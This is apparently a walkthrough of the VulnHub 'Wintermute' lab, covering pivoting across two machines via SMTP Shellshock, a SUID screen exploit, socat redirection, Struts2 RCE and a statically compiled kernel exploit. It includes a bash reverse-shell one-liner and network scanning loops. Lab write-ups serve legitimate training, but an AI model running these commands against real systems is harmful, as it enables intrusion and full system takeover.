# Wintermute: Walkthrough

## Overview
**Machine Name**: Wintermute
**Platform**: VulnHub
**Difficulty**: Hard
**OS**: Linux
**Focus**: Double Machine Pivoting, Shellshock SMTP, Struts2 RCE, Socat Traffic Redirection, Static Compilation Kernel Exploit

---

# STRAYLIGHT

## Enumeration (Straylight)
### Network Discovery
An Nmap ping sweep located the Straylight host IP: `192.168.111.130`.
![](screenshots/Pasted%20image%2020260603190810.png)

### Port Scanning
A full TCP port scan was executed:
```bash
nmap -Pn -sT -A -oA wintermute-straylight -p- 192.168.111.130
```
Open ports list:
| Port | Service | Version |
| --- | --- | --- |
| 25/tcp | smtp | Postfix smtpd |
| 80/tcp | http | Apache httpd 2.4.25 |
| 3000/tcp | http | ntop-ng |

### SMTP Shellshock Enumeration
A Postfix SMTP command injection vulnerability (Shellshock via SMTP - CVE-2014-6271 / exploit 34896) was identified.

## Exploitation (Straylight)
### SMTP Command Injection
The SMTP Shellshock vulnerability was exploited to gain command execution by sending a forged email containing the Shellshock payload in the headers, triggering a reverse connection:
```python
# Exploit Title: Shellshock SMTP Exploit
# Exploit Author: fattymcwopr
# CVE: CVE-2014-6271
```
```bash
whoami
www-data
```

## Privilege Escalation (Straylight)
### SUID Screen Exploitation
Local enumeration found `/usr/bin/screen-4.5.0` configured with SUID permissions.
An exploit for this version of screen was found (exploit 41154). The script was converted to Unix format using `dos2unix` and executed:
```bash
dos2unix screen_exploit.sh
./screen_exploit.sh
```
![](screenshots/Pasted%20image%2020260604104111.png)
```bash
whoami
root
```

---

# NEUROMANCER

## Enumeration (Neuromancer)
### Pivot Network Discovery
On Straylight, a secondary network interface `ens34` (`192.168.126.111/24`) was discovered:
![](screenshots/Pasted%20image%2020260604105641.png)

A ping sweep script was executed from Straylight to discover hosts in the isolated network segment:
```bash
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.126.$i | grep "bytes from" & done; wait
```
This located Neuromancer at IP address `192.168.126.112`.
![](screenshots/Pasted%20image%2020260604114527.png)

### Port Scanning
A port scanning loop was executed to scan ports on Neuromancer:
```bash
for p in $(seq 1 65535); do (nc -nvzw1 192.168.126.112 $p 2>&1 | grep open &) ;done
```
![](screenshots/Pasted%20image%2020260604144839.png)
Open ports identified: `8009`, `8080`.

### Socat Pivoting
Socat was executed on Straylight to create listener redirects to access Neuromancer's web ports from the attacker machine:
```bash
socat tcp-listen:8009,fork tcp:192.168.126.112:8009 &
socat tcp-listen:8080,fork tcp:192.168.126.112:8080 &
```
![](screenshots/Pasted%20image%2020260604151712.png)

Browsing to `http://192.168.111.130:8080/struts2_2.3.15.1-showcase` displayed an active Apache Struts showcase website.
![](screenshots/Pasted%20image%2020260604151855.png)

## Exploitation (Neuromancer)
### Apache Struts2 RCE
An RCE exploit for Apache Struts2 (exploit 41570) was executed through the socat pivot, spawning a reverse connection caught on the Straylight host:
```bash
python2 strutci.py http://192.168.111.130:8080/struts2_2.3.15.1-showcase/showcase.jsp 'bash -i >& /dev/tcp/192.168.126.111/4321 0>&1'
```
![](screenshots/Pasted%20image%2020260604154109.png)
![](screenshots/Pasted%20image%2020260604154219.png)
```bash
whoami
tomcat
```
A TTY shell upgrade was completed, but sudo required credentials:
![](screenshots/Pasted%20image%2020260604154528.png)

## Privilege Escalation (Neuromancer)
### Local Enumeration
`linpeas` was transferred to Neuromancer by hosting it on the Kali VM, downloading it to Straylight, and then transferring it to Neuromancer:
![](screenshots/Pasted%20image%2020260604161359.png)

The Linux Debian kernel version was checked:
![](screenshots/Pasted%20image%2020260604165136.png)

A local kernel privilege escalation exploit (exploit 44298) was identified.

### Statically-Compiled Kernel Exploitation
Since Neuromancer had no compiler installed, the exploit was compiled on the attacker VM. Compilation on host initially failed due to compiler mismatch:
![](screenshots/Pasted%20image%2020260604165525.png)
![](screenshots/Pasted%20image%2020260604165455.png)

To resolve the mismatch, the exploit was statically compiled:
```bash
gcc -static exploit.c -o exploit
```

The compiled binary was transferred to Neuromancer, yielding root access:
![](screenshots/Pasted%20image%2020260604165411.png)
```bash
whoami
root
```

## Post-Exploitation
### Flag Recovery
- Root Flag recovered on Straylight and Neuromancer.

## Lessons Learned
1. Restrict SUID binaries like `screen` to prevent local privilege escalation.
2. Keep core web framework libraries like Apache Struts2 updated to patch high-severity remote command execution vulnerabilities.
3. Use static compilation options to compile local privilege escalation exploits when target machines lack developer toolchains.
